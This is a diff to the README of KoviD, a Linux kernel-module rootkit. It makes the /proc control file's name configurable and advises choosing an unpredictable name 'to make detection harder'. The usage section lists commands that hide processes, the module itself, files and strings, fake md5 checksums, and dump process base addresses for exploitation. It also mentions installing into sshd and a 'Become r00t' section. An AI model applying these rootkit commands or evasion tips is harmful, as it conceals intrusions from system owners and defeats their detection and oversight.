@@ -321,7 +321,7 @@
      14886 pts/0    S      0:00 ./tests/test
      14891 pts/0    S+     0:00 grep --color=auto 14886
     [ machine<!!! VM !!!> * 10:30:33 (dev) ~/Codes/lkm ]
-     $ echo 14886 >/proc/kovid
+     $ echo 14886 >/proc/mytest
     [ machine<!!! VM !!!> * 10:30:39 (dev) ~/Codes/lkm ]
      $ ps ax |grep 14886
      14899 pts/0    S+     0:00 grep --color=auto 14886
@@ -329,7 +329,7 @@
      $ sudo kill -9 14886
     kill: (14886): No such process
     [ machine<!!! VM !!!> * 10:30:48 (dev) ~/Codes/lkm ]
-     $ echo 14886 >/proc/kovid
+     $ echo 14886 >/proc/mytest
     [ machine<!!! VM !!!> * 10:30:52 (dev) ~/Codes/lkm ]
      $ ps ax |grep 14886
      14886 pts/0    S      0:00 ./tests/test
@@ -458,7 +458,7 @@
         $ sudo KOVID=/root/kovid.ko ./install.sh /usr/sbin/sshd
 
     Before running this script, make sure to:
-    KoviD:      build and insmod
+    KoviD:      build and insmod procname=<name>
     Volundr:    build
 ```
 
@@ -489,8 +489,8 @@
     Another little trick that can help exploiting other executables
     is to know their base addresses without having to open() /proc/<pid>/maps:
 
-    $ echo "-b <PID>" >/proc/kovid
-    $ cat /proc/kovid
+    $ echo "-b <PID>" >/proc/mytest
+    $ cat /proc/mytest
 
 ### 2.14 BPF
 
@@ -503,21 +503,38 @@
 
 ## 3 - Usage
 
-### 3.1 /proc/kovid interface
+    KoviD is to be loaded with command line argument procname.
+    This is will be the interface entrypoint /proc/<name>
 
-    /proc/kovid is available (but hidden) at insmod
-    time, it will fade away after 120 seconds.
+    Ex:
+        sudo insmod kovid procname=mytest
 
-    Bring /proc/kovid back after time out:
+    Throughout this document, I will use "mytest" for all examples.
+
+    Important: Make sure to never use "kovid" or any other easily predictable name,
+    to make detection harder.
+
+
+### 3.1 /proc/<name> interface
+
+    /proc/mytest is disabled by default, after module is loaded.
+    To enable the interface:
 ```bash
     $ kill -SIGCONT 31337
 ```
 
-    Repeating above command will toggle ON/OFF /proc/kovid
+    Interface will unload again after 120 seconds.
+
+    Bring /proc/mytest back after time out:
+```bash
+    $ kill -SIGCONT 31337
+```
+
+    Repeating above command will toggle ON/OFF /proc/mytest
     user interface.
 
     Usage:
-        echo "-[h|s|a|d|l|t0|t1|m0|m1|m|b|f] [argument(s)] >/proc/kovid
+        echo "-[h|s|a|d|l|t0|t1|m0|m1|m|b|f] [argument(s)] >/proc/mytest
 
         -h: hide kovid module
         -s: show hidden tasks in ring buffer (debug mode only)
@@ -529,7 +546,7 @@
         -m0: flag md5 persistence file to be removed when kovid is unloaded
         -m1: flag md5 persistence file to NOT be removed when kovid is unloaded (default)
         -m <fake_md5 original_md5>: add fake md5sum checksum for to be shown instead of original
-        -b <PID>: dump PID's (task) base address in /proc/kovid
+        -b <PID>: dump PID's (task) base address in /proc/mytest
         -f <string>: add string/phrase to be hidden from files
 
 ### 3.2 Help
@@ -540,7 +557,7 @@
 
     Hiding/Unhiding:
 ```bash
-    $ echo 14886 >/proc/kovid
+    $ echo 14886 >/proc/mytest
 ```
 
     If task is not hidden, it will, otherwise it will
@@ -551,7 +568,7 @@
 
     Show hidden tasks:
 ```bash
-    $ echo show >/proc/kovid
+    $ echo show >/proc/mytest
 ```
 
     Look at ring buffer (dmesg). Make sure to `dmesg -c` afterwards.
@@ -559,14 +576,14 @@
 ### 3.4 Hide module
 
     Hiding:
-    `$ echo -h >/proc/kovid`
+    `$ echo -h >/proc/mytest`
 
     In 'release' mode KoviD module is hidden by
     default and a 'key' can be shown:
-    `$ cat /proc/kovid`
+    `$ cat /proc/mytest`
 
     Hiding:
-    `$ echo "random key" >/proc/kovid`
+    `$ echo "random key" >/proc/mytest`
 
     You can't rmmod KoviD if it is hidden.
 
@@ -574,13 +591,13 @@
 ### 3.5 Hide/unhide/list files and directories
 
     Hiding:
-    `$ echo '-a name' >/proc/kovid`
+    `$ echo '-a name' >/proc/mytest`
 
     Unhiding:
-    `$ echo '-d name' >/proc/kovid`
+    `$ echo '-d name' >/proc/mytest`
 
     Listing hidden files and directory names:
-    `$ echo listname >/proc/kovid`
+    `$ echo listname >/proc/mytest`
 
 ### 3.6 Become r00t
 
